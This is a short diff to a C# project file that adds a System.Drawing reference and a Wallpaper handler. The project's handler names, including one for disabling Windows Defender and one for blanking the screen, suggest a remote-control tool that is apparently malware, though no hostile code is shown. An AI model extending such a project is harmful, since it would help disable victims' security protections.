@@ -35,6 +35,7 @@
   <ItemGroup>
     <Reference Include="System" />
     <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
     <Reference Include="System.Windows.Forms" />
     <Reference Include="System.Xml.Linq" />
     <Reference Include="System.Data.DataSetExtensions" />
@@ -46,6 +47,7 @@
     <Compile Include="Connection.cs" />
     <Compile Include="Handler\HandleBlankScreen.cs" />
     <Compile Include="Handler\HandleDisableDefender.cs" />
+    <Compile Include="Handler\Wallpaper.cs" />
     <Compile Include="MessagePack\BytesTools.cs" />
     <Compile Include="MessagePack\MsgPack.cs" />
     <Compile Include="MessagePack\MsgPackType.cs" />
